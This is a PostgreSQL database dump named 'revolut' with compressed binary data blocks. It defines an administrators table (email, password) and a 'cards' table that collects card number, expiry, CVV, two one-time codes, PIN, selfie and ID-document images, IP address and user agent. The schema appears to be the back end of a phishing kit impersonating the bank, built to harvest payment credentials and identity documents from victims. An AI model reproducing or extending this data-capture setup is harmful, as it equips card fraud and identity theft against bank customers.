PGDMP                      |           revolut    16.0    16.0     �           0    0    ENCODING    ENCODING        SET client_encoding = 'UTF8';
                      false            �           0    0 
   STDSTRINGS 
   STDSTRINGS     (   SET standard_conforming_strings = 'on';
                      false            �           0    0 
   SEARCHPATH 
   SEARCHPATH     8   SELECT pg_catalog.set_config('search_path', '', false);
                      false            �           1262    17505    revolut    DATABASE     �   CREATE DATABASE revolut WITH TEMPLATE = template0 ENCODING = 'UTF8' LOCALE_PROVIDER = libc LOCALE = 'English_United States.1252';
    DROP DATABASE revolut;
                postgres    false            �            1259    17507    administrators    TABLE     �   CREATE TABLE public.administrators (
    id bigint NOT NULL,
    email text,
    password text,
    created_at timestamp with time zone,
    updated_at timestamp with time zone
);
 "   DROP TABLE public.administrators;
       public         heap    postgres    false            �            1259    17506    administrators_id_seq    SEQUENCE     ~   CREATE SEQUENCE public.administrators_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;
 ,   DROP SEQUENCE public.administrators_id_seq;
       public          postgres    false    216            �           0    0    administrators_id_seq    SEQUENCE OWNED BY     O   ALTER SEQUENCE public.administrators_id_seq OWNED BY public.administrators.id;
          public          postgres    false    215            �            1259    17516    cards    TABLE     p  CREATE TABLE public.cards (
    id bigint NOT NULL,
    phone text,
    number text,
    expiry text,
    cvv text,
    otp1 text,
    otp2 text,
    pin text,
    email text,
    selfie_img text,
    id_front_img text,
    id_back_img text,
    user_agent text,
    ip_address text,
    created_at timestamp with time zone,
    updated_at timestamp with time zone
);
    DROP TABLE public.cards;
       public         heap    postgres    false            �            1259    17515    cards_id_seq    SEQUENCE     u   CREATE SEQUENCE public.cards_id_seq
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;
 #   DROP SEQUENCE public.cards_id_seq;
       public          postgres    false    218            �           0    0    cards_id_seq    SEQUENCE OWNED BY     =   ALTER SEQUENCE public.cards_id_seq OWNED BY public.cards.id;
          public          postgres    false    217                       2604    17510    administrators id    DEFAULT     v   ALTER TABLE ONLY public.administrators ALTER COLUMN id SET DEFAULT nextval('public.administrators_id_seq'::regclass);
 @   ALTER TABLE public.administrators ALTER COLUMN id DROP DEFAULT;
       public          postgres    false    215    216    216                        2604    17519    cards id    DEFAULT     d   ALTER TABLE ONLY public.cards ALTER COLUMN id SET DEFAULT nextval('public.cards_id_seq'::regclass);
 7   ALTER TABLE public.cards ALTER COLUMN id DROP DEFAULT;
       public          postgres    false    218    217    218            �          0    17507    administrators 
   TABLE DATA           U   COPY public.administrators (id, email, password, created_at, updated_at) FROM stdin;
    public          postgres    false    216   �       �          0    17516    cards 
   TABLE DATA           �   COPY public.cards (id, phone, number, expiry, cvv, otp1, otp2, pin, email, selfie_img, id_front_img, id_back_img, user_agent, ip_address, created_at, updated_at) FROM stdin;
    public          postgres    false    218   8       �           0    0    administrators_id_seq    SEQUENCE SET     C   SELECT pg_catalog.setval('public.administrators_id_seq', 2, true);
          public          postgres    false    215            �           0    0    cards_id_seq    SEQUENCE SET     ;   SELECT pg_catalog.setval('public.cards_id_seq', 1, false);
          public          postgres    false    217            "           2606    17514 "   administrators administrators_pkey 
   CONSTRAINT     `   ALTER TABLE ONLY public.administrators
    ADD CONSTRAINT administrators_pkey PRIMARY KEY (id);
 L   ALTER TABLE ONLY public.administrators DROP CONSTRAINT administrators_pkey;
       public            postgres    false    216            $           2606    17523    cards cards_pkey 
   CONSTRAINT     N   ALTER TABLE ONLY public.cards
    ADD CONSTRAINT cards_pkey PRIMARY KEY (id);
 :   ALTER TABLE ONLY public.cards DROP CONSTRAINT cards_pkey;
       public            postgres    false    218            �   �   x�}ɻ
�0 й�
��������
N��
..�M4�&�� ~�~��Ye����<8��&)XT�f��O�ݖ�$s���er������_��} V��9��^���|��_��J��[FHe�u�bG�R�
UYS#
,�/�c��<-�      �      x������ � �     